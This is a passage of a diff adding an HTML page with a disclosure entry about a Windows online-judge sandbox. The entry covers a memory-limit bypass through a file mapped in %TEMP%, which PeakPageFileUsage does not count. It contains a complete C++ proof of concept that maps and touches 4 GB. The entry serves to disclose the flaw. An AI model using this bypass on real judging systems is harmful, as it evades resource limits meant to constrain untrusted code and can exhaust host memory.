+<span class="hljs-punctuation">}</span>
+</code></pre>
+</div>
+</div>
+<p><strong>Affected</strong>:<br>Windows judger<br>during 1.0.0.0 internal check</p>
+<p><strong>Description</strong>:<br>A process can bypass memory limitations by creating a file in <code>%TEMP%</code> and mapping it into working pages using <code>CreateFileMappingA</code>/<code>MapViewOfFile</code>. The mapped memory is not fully accounted in <code>PeakPageFileUsage</code> reported by <code>GetProcessMemoryInfo</code>, so it evades the memory limit check.</p>
+<p><strong>Reason</strong>:  </p>
+<ol>
+<li>AppContainer allows RWE access to <code>%TEMP%</code>, enabling file creation and mapping.  </li>
+<li><code>PeakPageFileUsage</code> does not include the working set size of memory‑mapped files, so the memory consumption is not charged against the limit.</li>
+</ol>
+<p><strong>PoC</strong>:  </p>
+<div class="code-wrapper">
+<div class="code-header">
+    <span class="code-lang">CPP</span>
+    <button class="copy-btn" data-code="#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;chrono&gt;
+#include &lt;thread&gt;
+int main() {
+	const size_t SIZE = 4ULL * 1024 * 1024 * 1024;
+	char tempPath[MAX_PATH];
+	if (!GetTempPathA(MAX_PATH, tempPath)) return 1;
+	std::string filePath = std::string(tempPath) + &quot;poc_mmap.bin&quot;;
+	HANDLE hFile = CreateFileA(filePath.c_str(),
+							   GENERIC_READ | GENERIC_WRITE,
+							   FILE_SHARE_READ | FILE_SHARE_WRITE,
+							   NULL, CREATE_ALWAYS,
+							   FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) return 1;
+	LARGE_INTEGER li; li.QuadPart = SIZE;
+	if (!SetFilePointerEx(hFile, li, NULL, FILE_BEGIN) || !SetEndOfFile(hFile)) {
+		CloseHandle(hFile); return 1;
+	}
+	HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READWRITE,
+										 li.HighPart, li.LowPart, NULL);
+	if (!hMapping) { CloseHandle(hFile); return 1; }
+	void* view = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, SIZE);
+	if (!view) {
+		CloseHandle(hMapping); CloseHandle(hFile); return 1;
+	}
+	char* p = static_cast&lt;char*&gt;(view);
+	for (size_t i = 0; i &lt; SIZE; i += 4096) p[i] = 0xAA;
+	std::this_thread::sleep_for(std::chrono::seconds(4));
+	UnmapViewOfFile(view);
+	CloseHandle(hMapping);
+	CloseHandle(hFile);
+	DeleteFileA(filePath.c_str());
+	return 0;
+}
+">复制</button>
+</div>
+<div class="code-content">
+    <pre><code class="hljs language-cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;chrono&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+	<span class="hljs-type">const</span> <span class="hljs-type">size_t</span> SIZE = <span class="hljs-number">4ULL</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>;
+	<span class="hljs-type">char</span> tempPath[MAX_PATH];
+	<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetTempPathA</span>(MAX_PATH, tempPath)) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	std::string filePath = std::<span class="hljs-built_in">string</span>(tempPath) + <span class="hljs-string">&quot;poc_mmap.bin&quot;</span>;
+	HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(filePath.<span class="hljs-built_in">c_str</span>(),
+							   GENERIC_READ | GENERIC_WRITE,
+							   FILE_SHARE_READ | FILE_SHARE_WRITE,
+							   <span class="hljs-literal">NULL</span>, CREATE_ALWAYS,
+							   FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);
+	<span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	LARGE_INTEGER li; li.QuadPart = SIZE;
+	<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">SetFilePointerEx</span>(hFile, li, <span class="hljs-literal">NULL</span>, FILE_BEGIN) || !<span class="hljs-built_in">SetEndOfFile</span>(hFile)) {
+		<span class="hljs-built_in">CloseHandle</span>(hFile); <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+	HANDLE hMapping = <span class="hljs-built_in">CreateFileMappingA</span>(hFile, <span class="hljs-literal">NULL</span>, PAGE_READWRITE,
+										 li.HighPart, li.LowPart, <span class="hljs-literal">NULL</span>);
+	<span class="hljs-keyword">if</span> (!hMapping) { <span class="hljs-built_in">CloseHandle</span>(hFile); <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; }
+	<span class="hljs-type">void</span>* view = <span class="hljs-built_in">MapViewOfFile</span>(hMapping, FILE_MAP_WRITE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, SIZE);
+	<span class="hljs-keyword">if</span> (!view) {
+		<span class="hljs-built_in">CloseHandle</span>(hMapping); <span class="hljs-built_in">CloseHandle</span>(hFile); <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+	<span class="hljs-type">char</span>* p = <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-type">char</span>*&gt;(view);
+	<span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; SIZE; i += <span class="hljs-number">4096</span>) p[i] = <span class="hljs-number">0xAA</span>;
+	std::this_thread::<span class="hljs-built_in">sleep_for</span>(std::chrono::<span class="hljs-built_in">seconds</span>(<span class="hljs-number">4</span>));
+	<span class="hljs-built_in">UnmapViewOfFile</span>(view);
+	<span class="hljs-built_in">CloseHandle</span>(hMapping);
+	<span class="hljs-built_in">CloseHandle</span>(hFile);
+	<span class="hljs-built_in">DeleteFileA</span>(filePath.<span class="hljs-built_in">c_str</span>());
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+</div>
+</div>
+<p><strong>Status</strong>:<br>Alleviated, but not fully resolved</p>
+</div>
+        <div class="footer">
+            <p>© 2026 · 本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议</p>
+        </div>
+    </div>
+    
+</div>
+<script>
+(function() {
+    // 复制按钮
+    document.querySelectorAll('.copy-btn').forEach(btn => {
+        btn.addEventListener('click', async () => {
+            const code = btn.getAttribute('data-code');
+            if (code) {
+                await navigator.clipboard.writeText(code);
+                const orig = btn.textContent;
+                btn.textContent = '已复制！';
+                btn.classList.add('copied');
+                setTimeout(() => { btn.textContent = orig; btn.classList.remove('copied'); }, 2000);
+            }
+        });
+    });
+    
+    
+})();
+</script>
+</body>
+</html>
